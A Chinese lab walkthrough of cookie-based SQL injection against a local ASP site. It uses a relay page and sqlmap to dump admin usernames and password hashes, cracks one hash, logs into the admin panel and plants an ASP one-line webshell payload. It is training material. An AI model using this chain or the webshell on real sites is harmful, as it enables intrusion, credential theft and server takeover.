#### 环境装备
- Windows 8.1主机
	- ip:192.168.48.1
	- 超级小旋风建站
		- 192.168.48.1:8001  南方数据网站管理系统正式版5.0正式版
		- 192.168.48.1:8002  注入中转生成器生成的asp网站
	- 注入中转生成器
- kail 
	- ip: 192.168.48.129
	- sqlmap

#### 可能有用的链接

- [cookie注入原理以及利用(cookie中转注入)](http://blog.csdn.net/gscaiyucheng/article/details/19971837)
- [ 网络安全系列之八 Cookie注入（注入中转）](http://yttitan.blog.51cto.com/70821/1562382)
- [手工COOKIES注入及工具Cookies注入中转 ](http://tiannanyi.blog.163.com/blog/static/187359344201352052954459/)
- [利用SQLMap进行cookie注入](http://www.91ri.org/4714.html)

### 注入步骤

##### 1.尝试直接注入

```bash
root@kali:~# sqlmap -u http://192.168.48.1:8001/ProductShow.asp?ArticleID=60

省略n行
[20:16:24] [CRITICAL] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. Please, consider usage of tampering scripts as your target might filter the queries. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp'). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment')

[*] shutting down at 20:16:24

注入失败
```

##### 2.注入中转生成器生成注入页面

![中转生成器生成注入页面](http://asec.me/wp-content/uploads/2017/09/1.png)

**注意"post提交值"一定要用默认的"jmdcw="**

##### 3.将生成的`jmCook.asp`放到搭建的192.168.48.1:8002目录下

构建的注入点为: `http://192.168.48.1:8002/jmCook.asp?jmdcw=60`

##### 4.使用sqlmap猜表名

```bash
root@kali:~# sqlmap -u http://192.168.48.1:8002/jmCook.asp?jmdcw=60 --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.1.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

******中间省略n行******                                      
[19:46:14] [INFO] tried 5/3154 items (0%)
[19:46:15] [INFO] retrieved: product                                                                                                                                                          
[19:46:18] [INFO] retrieved: admin                                                                                                                                                            
[19:46:20] [INFO] retrieved: news                                                                                                                                                             
[19:46:24] [INFO] retrieved: book                                                                                                                                                             
[19:46:27] [INFO] retrieved: links                                                                                                                                                            
[19:46:53] [INFO] retrieved: job                                                                                                                                                              
[19:47:01] [INFO] retrieved: vote                                                                                                                                                             
[19:47:12] [INFO] retrieved: email                                                                                                                                                          
[19:48:32] [INFO] retrieved: download                                                                                                        
[19:48:35] [INFO] retrieved: main                                                                                                               
Database: Microsoft_Access_masterdb
[11 tables]
+----------+
| user     |
| admin    |
| book     |
| download |
| email    |
| job      |
| links    |
| main     |
| news     |
| product  |
| vote     |
+----------+
[19:50:33] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.48.1'
```
获取字段:
```bash
sqlmap -u http://192.168.48.1:8002/jmCook.asp?jmdcw=60 -T admin --columns

Table: admin
[10 columns]
+------------+-------------+
| Column     | Type        |
+------------+-------------+
| key        | non-numeric |
| articleid  | numeric     |
| content    | non-numeric |
| id         | numeric     |
| password   | non-numeric |
| price      | numeric     |
| product_id | numeric     |
| title      | non-numeric |
| unit       | non-numeric |
| username   | non-numeric |
+------------+-------------+

```
获取admin表的username和password字段
```
root@kali:~# sqlmap -u http://192.168.48.1:8002/jmCook.asp?jmdcw=60 --tables --dump -T admin

省略n行:
Table: admin
[3 entries]

| username | password |
| admin    | 3acdbb255b45d296 |
| zhucebu  | a949f1be8de56824 |
| abc      | 3cd24fb0d6963f7d |
[21:11:48] [INFO] table 'Microsoft_Access_masterdb.admin' dumped to CSV file '/root/.sqlmap/output/192.168.48.1/dump/Microsoft_Access_masterdb/admin.csv'
[21:11:48] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.48.1'

[*] shutting down at 21:11:48

```
得到密码为 `3acdbb255b45d296`,解md5得 0791idc

![解3acdbb255b45d296md5](http://asec.me/wp-content/uploads/2017/09/2.png)

扫描得后台登录地址为: `http://192.168.48.1:8001/admin/Login.asp`

![解3acdbb255b45d296md5](http://asec.me/wp-content/uploads/2017/09/3.png)

进后台修改版权信息为一句话木马`"%><%eval request("abc")%><%'"`

![版权信息](http://asec.me/wp-content/uploads/2017/09/4.png)

菜刀连接:

![菜刀配置](http://asec.me/wp-content/uploads/2017/09/5.png)
![菜刀连接](http://asec.me/wp-content/uploads/2017/09/6.png)
